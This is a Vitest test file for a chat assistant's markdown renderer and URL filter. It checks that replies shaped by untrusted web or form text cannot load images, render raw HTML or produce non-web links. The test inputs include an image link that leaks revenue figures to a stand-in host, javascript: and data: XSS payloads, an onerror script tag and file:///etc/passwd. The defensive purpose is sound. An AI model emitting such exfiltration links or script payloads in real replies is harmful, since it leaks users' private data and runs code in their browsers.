import { describe, it, expect } from "vitest";
import { renderToStaticMarkup } from "react-dom/server";
import AssistantMarkdown from "./AssistantMarkdown";
import { safeUrl } from "./safeUrl";

// Pilot Brain's replies can be shaped by text nobody on the team wrote (web
// pages, names typed into the public booking form). What the chat draws from a
// reply is therefore limited: no pictures (they load with no click, so a
// picture's address can carry private figures out), only real web/mail links,
// and never raw HTML. These render the real component to static HTML — no
// browser needed — and look at what would actually be on the page.
const render = (markdown: string) => renderToStaticMarkup(<AssistantMarkdown content={markdown} />);

describe("Pilot Brain replies never load an outside picture", () => {
  it("draws no image, and never mentions the outside address, for a markdown picture", () => {
    const html = render("Revenue is fine. ![status](https://evil.example/leak?d=Revenue-9000-LEADPERSON-ZED)");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("evil.example");
    expect(html).not.toContain("Revenue-9000");
    // React would otherwise also ask the browser to pre-load the picture
    expect(html).not.toContain("<link");
    expect(html).not.toContain("preload");
  });

  it("does the same for a picture written as a reference, and one with no alt text", () => {
    for (const markdown of [
      "![x][r]\n\n[r]: https://evil.example/r.png",
      "![](https://evil.example/pixel.gif)",
      "![a](//evil.example/protocol-relative.png)",
      "![a](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)",
    ]) {
      const html = render(markdown);
      expect(html, markdown).not.toContain("<img");
      expect(html, markdown).not.toContain("evil.example");
      expect(html, markdown).not.toContain("<link");
    }
  });

  it("keeps a dropped picture's alt text as plain text, or shows nothing at all when there is none", () => {
    const withAlt = render("![the alt words](https://evil.example/a.png)");
    expect(withAlt).toContain("<span>the alt words</span>");
    expect(withAlt).not.toContain("<img");

    const withoutAlt = render("![](https://evil.example/a.png)");
    expect(withoutAlt).not.toContain("<span");
    expect(withoutAlt).not.toContain("<img");
    expect(withoutAlt).not.toContain("evil.example");
  });
});

describe("links in Pilot Brain replies", () => {
  it("turns javascript:, data:, file: and other non-web links into plain text, keeping the words", () => {
    for (const markdown of [
      "[click me](javascript:alert(1))",
      "[click me](JaVaScRiPt:alert(1))",
      "[click me](java&#10;script:alert(1))",
      "[click me](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
      "[click me](vbscript:msgbox(1))",
      "[click me](file:///C:/Windows/win.ini)",
      "[click me](/settings)",
      "[click me](//evil.example/x)",
      "[click me](ftp://evil.example/x)",
    ]) {
      const html = render(markdown);
      expect(html, markdown).not.toContain("<a");
      expect(html, markdown).not.toContain("href");
      expect(html, markdown).toContain("click me");
    }
  });

  it("still renders a normal web link, opening in a new tab with noopener noreferrer", () => {
    const html = render("See [the listing](https://www.autotrader.co.uk/cars/ford-fiesta?a=1&b=2) for more.");
    expect(html).toContain('href="https://www.autotrader.co.uk/cars/ford-fiesta?a=1&amp;b=2"');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
    expect(html).toContain(">the listing</a>");
    expect(html.match(/<a /g)).toHaveLength(1);
  });

  it("keeps plain http links and mailto links working", () => {
    expect(render("[old site](http://example.com/page)")).toContain('href="http://example.com/page"');
    const mail = render("[email us](mailto:sales@example.com)");
    expect(mail).toContain('href="mailto:sales@example.com"');
    expect(mail).toContain('rel="noopener noreferrer"');
  });

  it("makes an autolinked address safe in the same way", () => {
    const html = render("<https://example.com/a> and <javascript:alert(1)>");
    expect(html).toContain('<a href="https://example.com/a" target="_blank" rel="noopener noreferrer">');
    expect(html).not.toContain('href="javascript');
  });
});

describe("raw HTML in a reply is text, never elements", () => {
  it("does not turn tags into elements", () => {
    const html = render(
      'Hi <img src="https://evil.example/h.png" onerror="alert(1)"> <script>alert(1)</script> <a href="javascript:alert(1)">x</a> <iframe src="https://evil.example"></iframe>'
    );
    expect(html).not.toContain("<img");
    expect(html).not.toContain("<script");
    expect(html).not.toContain("<iframe");
    expect(html).not.toContain("<a");
    // ...the words are still there, escaped, so nothing is silently swallowed
    expect(html).toContain("&lt;script&gt;");
  });
});

describe("normal replies still look right", () => {
  it("renders bold, headings, lists and dividers", () => {
    const html = render(
      "# Big heading\n\n## Smaller\n\nThis is **important** and this is fine.\n\n- one\n- two\n\n1. first\n2. second\n\n---\n\nDone."
    );
    expect(html).toContain("<h3");
    expect(html).toContain("Big heading");
    expect(html).toContain("<h4");
    expect(html).toContain('<strong style="color:#fff">important</strong>');
    expect(html).toContain("<ul");
    expect(html).toContain("<li");
    expect(html).toContain(">one</li>");
    expect(html).toContain("<ol");
    expect(html).toContain(">second</li>");
    expect(html).toContain("<hr");
  });

  it("renders the 'Sources' footer written under a web-backed reply as safe links", () => {
    const reply =
      "Asking prices are roughly £6,000–£7,500." +
      "\n\n---\n**Sources (live web, looked up just now)**\n\n" +
      "- [Used Ford Fiesta for sale](https://www.autotrader.co.uk/cars/ford-fiesta) — autotrader.co.uk, page dated September 2, 2026\n" +
      "- [A page](https://www.parkers.co.uk/x) — parkers.co.uk";
    const html = render(reply);
    expect(html.match(/<a /g)).toHaveLength(2);
    expect(html.match(/target="_blank"/g)).toHaveLength(2);
    expect(html.match(/rel="noopener noreferrer"/g)).toHaveLength(2);
    expect(html).toContain("Sources (live web, looked up just now)");
    expect(html).toContain("<hr");
  });
});

describe("safeUrl — the one rule for links from places we don't control", () => {
  it("accepts http and https, and hands back the parsed address", () => {
    expect(safeUrl("https://www.autotrader.co.uk/cars?a=1&b=2")).toBe("https://www.autotrader.co.uk/cars?a=1&b=2");
    expect(safeUrl("http://example.com")).toBe("http://example.com/");
    expect(safeUrl("  HTTPS://Example.com/Path  ")).toBe("https://example.com/Path");
  });

  it("accepts mailto only when the caller says a mail link is fine", () => {
    expect(safeUrl("mailto:a@b.com")).toBeNull();
    expect(safeUrl("mailto:a@b.com", { allowMailto: true })).toBe("mailto:a@b.com");
    expect(safeUrl("mailto:a@b.com", { allowMailto: false })).toBeNull();
  });

  it("refuses everything that isn't a real web link", () => {
    for (const bad of [
      "javascript:alert(1)",
      "JAVASCRIPT:alert(1)",
      "java\nscript:alert(1)",
      "java\tscript:alert(1)",
      " javascript:alert(1)",
      "data:text/html;base64,PHNjcmlwdD4=",
      "vbscript:msgbox(1)",
      "file:///etc/passwd",
      "ftp://example.com/x",
      "blob:https://example.com/uuid",
      "/relative/path",
      "//evil.example/x",
      "settings",
      "https://",
      "",
      "   ",
    ]) {
      expect(safeUrl(bad, { allowMailto: true }), JSON.stringify(bad)).toBeNull();
    }
  });

  it("refuses anything that isn't a string", () => {
    for (const bad of [undefined, null, 42, {}, [], ["https://example.com"]]) {
      expect(safeUrl(bad)).toBeNull();
    }
  });
});
